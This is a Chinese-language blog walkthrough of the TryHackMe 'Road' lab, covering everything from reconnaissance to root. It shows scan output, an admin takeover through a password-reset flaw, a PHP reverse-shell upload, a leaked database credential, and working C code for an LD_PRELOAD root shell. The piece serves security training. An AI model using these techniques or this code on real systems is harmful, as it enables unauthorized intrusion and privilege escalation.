    <title>WP-TryHackMe-Road</title>
    <link href="http://example.com/2023/02/28/WP-TryHackMe-Road/"/>
    <id>http://example.com/2023/02/28/WP-TryHackMe-Road/</id>
    <published>2023-02-28T02:32:58.000Z</published>
    <updated>2023-03-13T17:30:11.003Z</updated>
    
    <content type="html"><![CDATA[<p>题目描述说来自真实场景，所以来看一下</p><h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><p>Nmap</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[sudo] tiger 的密码：</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-28 10:43 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.200.6</span><br><span class="line">Host is up (0.32s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 e6:dc:88:69:de:a1:73:8e:84:5b:a1:3e:27:9f:07:24 (RSA)</span><br><span class="line">|   256 6b:ea:18:5d:8d:c7:9e:9a:01:2c:<span class="built_in">dd</span>:50:c5:f8:c8:05 (ECDSA)</span><br><span class="line">|_  256 ef:06:d7:e4:b1:65:15:6e:94:62:cc:<span class="built_in">dd</span>:f0:8a:1a:24 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-title: Sky Couriers</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 20.16 seconds</span><br></pre></td></tr></table></figure><p>22与80端口，且系统为Ubuntu。先看看80端口</p><h3 id="80"><a href="#80" class="headerlink" title="80"></a>80</h3><p>添加hosts后，访问road.com，是一个web解决方案供应商</p><p><img src="/2023/02/28/WP-TryHackMe-Road/image-20230228105314611.png" alt="image-20230228105314611"></p><p>目录枚举，尝试使用<code>wfuzz</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">└─$ sudo wfuzz -c --hc=400,404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://road.com/FUZZ </span><br><span class="line"> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="string">&#x27;s documentation for more information.</span></span><br><span class="line"><span class="string">********************************************************</span></span><br><span class="line"><span class="string">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span></span><br><span class="line"><span class="string">********************************************************</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Target: http://road.com/FUZZ</span></span><br><span class="line"><span class="string">Total requests: 220560</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">=====================================================================</span></span><br><span class="line"><span class="string">ID           Response   Lines    Word       Chars       Payload                                                                                                                     </span></span><br><span class="line"><span class="string">=====================================================================</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">000000001:   200        539 L    1631 W     19607 Ch    &quot;# directory-list-2.3-medium.txt&quot;                                                                                           </span></span><br><span class="line"><span class="string">000000003:   200        539 L    1631 W     19607 Ch    &quot;# Copyright 2007 James Fisher&quot;                                                                                             </span></span><br><span class="line"><span class="string">000000007:   200        539 L    1631 W     19607 Ch    &quot;# license, visit http://creativecommons.org/licenses/by-sa/3.0/&quot;                                                           </span></span><br><span class="line"><span class="string">000000014:   200        539 L    1631 W     19607 Ch    &quot;http://road.com/&quot;                                                                                                          </span></span><br><span class="line"><span class="string">000000013:   200        539 L    1631 W     19607 Ch    &quot;#&quot;                                                                                                                         </span></span><br><span class="line"><span class="string">000000002:   200        539 L    1631 W     19607 Ch    &quot;#&quot;                                                                                                                         </span></span><br><span class="line"><span class="string">000000004:   200        539 L    1631 W     19607 Ch    &quot;#&quot;                                                                                                                         </span></span><br><span class="line"><span class="string">000000012:   200        539 L    1631 W     19607 Ch    &quot;# on atleast 2 different hosts&quot;                                                                                            </span></span><br><span class="line"><span class="string">000000011:   200        539 L    1631 W     19607 Ch    &quot;# Priority ordered case sensative list, where entries were found&quot;                                                          </span></span><br><span class="line"><span class="string">000000010:   200        539 L    1631 W     19607 Ch    &quot;#&quot;                                                                                                                         </span></span><br><span class="line"><span class="string">000000006:   200        539 L    1631 W     19607 Ch    &quot;# Attribution-Share Alike 3.0 License. To view a copy of this&quot;                                                             </span></span><br><span class="line"><span class="string">000000009:   200        539 L    1631 W     19607 Ch    &quot;# Suite 300, San Francisco, California, 94105, USA.&quot;                                                                       </span></span><br><span class="line"><span class="string">000000008:   200        539 L    1631 W     19607 Ch    &quot;# or send a letter to Creative Commons, 171 Second Street,&quot;                                                                </span></span><br><span class="line"><span class="string">000000005:   200        539 L    1631 W     19607 Ch    &quot;# This work is licensed under the Creative Commons&quot;                                                                        </span></span><br><span class="line"><span class="string">000000291:   301        9 L      28 W       305 Ch      &quot;assets&quot;                                                                                                                    </span></span><br><span class="line"><span class="string">000001012:   301        9 L      28 W       301 Ch      &quot;v2&quot;                                                                                                                        </span></span><br><span class="line"><span class="string">000045240:   200        539 L    1631 W     19607 Ch    &quot;http://road.com/&quot;       </span></span><br></pre></td></tr></table></figure><p>在<code>Merchant Central</code>那点击后跳转到商家的后台管理地址</p><p><img src="/2023/02/28/WP-TryHackMe-Road/image-20230228105649352.png" alt="image-20230228105649352"></p><p><img src="/2023/02/28/WP-TryHackMe-Road/image-20230228105918535.png" alt="image-20230228105918535"></p><p>在个人中心那找到了管理员的账户信息：<a href="mailto:&#x61;&#100;&#x6d;&#x69;&#x6e;&#x40;&#x73;&#x6b;&#121;&#x2e;&#x74;&#x68;&#109;">&#x61;&#100;&#x6d;&#x69;&#x6e;&#x40;&#x73;&#x6b;&#121;&#x2e;&#x74;&#x68;&#109;</a></p><p><img src="/2023/02/28/WP-TryHackMe-Road/image-20230228122834235.png" alt="image-20230228122834235"></p><p>看看重置密码页面是否有逻辑漏洞</p><p><img src="/2023/02/28/WP-TryHackMe-Road/image-20230228123048131.png" alt="image-20230228123048131"></p><p>burp拦截并修改username</p><p><img src="/2023/02/28/WP-TryHackMe-Road/image-20230228123827023.png" alt="image-20230228123827023"></p><p>成功登录</p><p>利用图片上传功能，上传php-reverseshell，源码中暴露了路径</p><p><img src="/2023/02/28/WP-TryHackMe-Road/image-20230228125326029.png" alt="image-20230228125326029"></p><p>本地监听1234端口，访问路径：http:&#x2F;&#x2F;..&#x2F;v2&#x2F;profileimages&#x2F;reverse.php</p><p><img src="/2023/02/28/WP-TryHackMe-Road/image-20230228130014100.png" alt="image-20230228130014100"></p><h3 id="user-txt"><a href="#user-txt" class="headerlink" title="user.txt"></a>user.txt</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> /home/webdeveloper/user.txt</span><br><span class="line">63191e4ece37523c9fe6bb62a5e64d45</span><br></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>netstat命令找不到，ss查看连接套接字情况</p><p><img src="/2023/02/28/WP-TryHackMe-Road/image-20230228131626211.png" alt="image-20230228131626211"></p><p>27017端口有一个mongodb的进程，连接查看</p><p><img src="/2023/02/28/WP-TryHackMe-Road/image-20230228131818787.png" alt="image-20230228131818787"></p><p>通过user表，获取到了一个账户信息：<code>webdeveloper:BahamasChapp123!@#</code></p><p><img src="/2023/02/28/WP-TryHackMe-Road/image-20230228132036064.png" alt="image-20230228132036064"></p><p>ssh连接，成功login</p><p><img src="/2023/02/28/WP-TryHackMe-Road/image-20230228132315030.png" alt="image-20230228132315030"></p><blockquote><p>当你在一个使用 sudo 的系统上登录时，你可能会被授予一些权限，这些权限可能允许你执行特定的操作，例如安装软件包、编辑系统文件等。使用 <code>sudo -l</code> 命令，你可以查看自己当前的权限，以及哪些命令可以使用 sudo 执行。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">webdeveloper@sky:~$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> webdeveloper on sky:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD</span><br><span class="line"></span><br><span class="line">User webdeveloper may run the following commands on sky:</span><br><span class="line">    (ALL : ALL) NOPASSWD: /usr/bin/sky_backup_utility</span><br></pre></td></tr></table></figure><p>LD_Preload提权</p><blockquote><p><code>env_keep</code> 是一个在 Linux 系统中用于控制哪些环境变量可以在 sudo 命令执行期间保持不变的设置。</p><p>当用户使用 sudo 命令来执行需要特权的任务时，sudo 会创建一个新的 shell 环境来执行该命令。在这个新的 shell 环境中，sudo 可以使用 <code>env_keep</code> 设置来保持一些环境变量的值不变，而不是使用默认的环境变量值。</p></blockquote><blockquote><p>在 C 语言中，<code>_init</code> 函数是一个特殊的函数，用于在共享库加载时执行一些初始化操作。当使用共享库时，操作系统会自动加载共享库并在加载时调用 <code>_init</code> 函数。</p></blockquote><p>编写一个以root权限运行的共享库</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -fPIC -shared -o shell.so shell.c -nostartfiles</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> _init() &#123;</span><br><span class="line"><span class="comment">// 取消设置环境变量</span></span><br><span class="line">unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line"><span class="comment">// 设置有效uid和gid为root</span></span><br><span class="line">setgid(<span class="number">0</span>);</span><br><span class="line">setuid(<span class="number">0</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>root</p><p><img src="/2023/02/28/WP-TryHackMe-Road/image-20230228135603187.png" alt="image-20230228135603187"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php</a></p><p><a href="https://medium.com/@fathindos.fd/road-tryhackme-93187b584ec9">https://medium.com/@fathindos.fd/road-tryhackme-93187b584ec9</a></p><p><a href="https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/">https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;题目描述说来自真实场景，所以来看一下&lt;/p&gt;
